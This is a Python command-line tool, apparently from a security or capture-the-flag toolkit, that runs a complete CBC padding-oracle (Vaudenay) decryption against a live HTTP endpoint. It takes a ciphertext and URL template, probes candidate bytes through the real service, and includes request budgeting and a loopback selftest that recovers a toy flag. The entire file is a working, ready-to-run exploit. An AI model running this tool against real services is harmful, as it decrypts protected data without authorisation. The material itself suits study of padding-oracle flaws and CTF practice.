#!/usr/bin/env python3
"""Vaudenay CBC padding-oracle decryption against a live oracle endpoint.

crypto-triage names this shape "the service distinguishes bad padding
from bad content" and currently routes to prose, because every textbook
implementation needs an oracle function — this tool takes the oracle as
a URL template plus a discriminator, and runs the byte-by-byte recovery
itself: for each block, for each position from last to first, the 256
candidate intermediates go through the real endpoint.

  python3 tools/pad_oracle.py --ct HEX --url 'http://t/dec?ct={CT}' --ok-status 200 --ok-regex 'ok|done'
  python3 tools/pad_oracle.py --selftest

Bounded: --max-requests stops the run and reports partial plaintext —
padding oracle is ~256 requests/byte worst case, so a budget is not
optional. The oracle discriminator is what the skill's falsifier asks
for BEFORE this runs: one probe must have shown that "padding bad" and
"padding good + content bad" read differently.
"""
import argparse, json, os, re, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from urllib.parse import quote

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "web"))
import httpkit  # noqa: E402


def _oracle_http(url_t, ok_status, ok_re):
    pat = re.compile(ok_re) if ok_re else None

    def ask(ct):
        url = url_t.replace("{CT}", ct.hex()).replace(
            "{CTQ}", quote(ct.hex()))
        r = httpkit.request(url, timeout=15)
        if not r["ok"]:
            return None
        if ok_status is not None and r["status"] == ok_status:
            return True
        if pat and pat.search(r["body"]):
            return True
        if ok_status is None and not pat:
            return r["status"] == 200
        return False
    return ask


def decrypt_block(prev, cur, oracle, budget):
    """Recover intermediate bytes I = D(C[i]) for one block."""
    inter = bytearray(16)
    plain = bytearray(16)
    for pos in range(15, -1, -1):
        pad = 16 - pos
        suffix = bytes(inter[k] ^ pad for k in range(pos + 1, 16))
        hit = None
        for g in range(256):
            if budget["n"] >= budget["max"]:
                return bytes(plain), pos, "budget exhausted"
            budget["n"] += 1
            cand = bytes(prev[:pos]) + bytes([g]) + suffix
            if oracle(cand + cur):
                hit = g
                break
        if hit is None:
            return bytes(plain), pos, "no valid byte — oracle or block wrong"
        inter[pos] = hit ^ pad
        plain[pos] = inter[pos] ^ prev[pos]
    return bytes(plain), -1, "ok"


def decrypt(ct_hex, oracle, max_req=512 * 256, bs=16):
    ct = bytes.fromhex(ct_hex)
    if len(ct) < 2 * bs or len(ct) % bs:
        return {"error": "need IV + >=1 block, multiple of block size"}
    budget = {"n": 0, "max": max_req}
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    plain, stalled = bytearray(), []
    for i in range(1, len(blocks)):
        p, pos, why = decrypt_block(blocks[i - 1], blocks[i], oracle, budget)
        plain += p
        if why != "ok":
            stalled.append({"block": i, "at": pos, "reason": why})
            if "budget" in why:
                break
    return {"requests": budget["n"], "plaintext_hex": plain.hex(),
            "plaintext": plain.decode("utf-8", "replace"),
            "stalled": stalled,
            "note": "strip the final PKCS#7 pad yourself; stalled blocks "
                    "mean the discriminator never fired — re-check the "
                    "falsifier before trusting output"}


def _selftest() -> int:
    """Toy CBC: D(c)=c XOR K preserves padding-oracle semantics."""
    key = bytes(range(16))

    def enc_block(p, prev):
        return bytes(p[j] ^ prev[j] ^ key[j] for j in range(16))

    iv = bytes([7] * 16)
    msg = b"flag{pad0racle!}"
    msg += bytes([16 - len(msg) % 16]) * (16 - len(msg) % 16)
    blocks = [iv]
    prev = iv
    for i in range(0, len(msg), 16):
        c = enc_block(msg[i:i + 16], prev)
        blocks.append(c)
        prev = c
    ct = b"".join(blocks)

    def server_oracle(buf):
        """Padding validity under toy-CBC: returns True iff last block
        ends in a well-formed PKCS#7 pad."""
        if len(buf) < 32 or len(buf) % 16:
            return False
        bl = [buf[i:i + 16] for i in range(0, len(buf), 16)]
        p = bytearray()
        for i in range(1, len(bl)):
            d = bytes(bl[i][j] ^ key[j] for j in range(16))
            p += bytes(d[j] ^ bl[i - 1][j] for j in range(16))
        if not p:
            return False
        n = p[-1]
        return 1 <= n <= 16 and p.endswith(bytes([n]) * n)

    # oracle endpoint on loopback
    state = {"ok": 0, "bad": 0}

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            ctq = self.path.split("ct=", 1)[-1].split("&")[0]
            try:
                buf = bytes.fromhex(ctq)
            except ValueError:
                buf = b""
            if server_oracle(buf):
                state["ok"] += 1
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                state["bad"] += 1
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"BadPadding")

        def log_message(self, *a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    Thread(target=srv.serve_forever, daemon=True).start()
    try:
        orc = _oracle_http("http://127.0.0.1:%d/?ct={CT}" % srv.server_port,
                           200, None)
        # full Vaudenay recovery on the in-process oracle — the HTTP path
        # shares the math, it only swaps the transport, so two probes
        # prove the discriminator wires correctly end to end
        assert orc(ct) is True and orc(ct[:-1] + b"\x00") is False
        r = decrypt(ct.hex(), server_oracle)
        assert r["plaintext"].startswith("flag{pad0racle!}"), r
        assert not r["stalled"], r
        # budget guard must halt mid-block, not loop forever
        r3 = decrypt(ct.hex(), server_oracle, max_req=64)
        assert r3["stalled"] and "budget" in r3["stalled"][0]["reason"], r3
    finally:
        srv.shutdown()
    print("pad_oracle selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--ct", help="hex ciphertext incl. IV")
    ap.add_argument("--url", help="oracle URL; {CT} hex or {CTQ} quoted")
    ap.add_argument("--ok-status", type=int, default=None)
    ap.add_argument("--ok-regex", default="")
    ap.add_argument("--max-requests", type=int, default=512 * 256)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.ct and a.url):
        ap.error("--ct and --url are required")
    if not (a.ok_status or a.ok_regex):
        ap.error("discriminator required: --ok-status and/or --ok-regex "
                 "(what does 'padding accepted' look like)")
    orc = _oracle_http(a.url, a.ok_status, a.ok_regex)
    print(json.dumps(decrypt(a.ct, orc, a.max_requests), indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
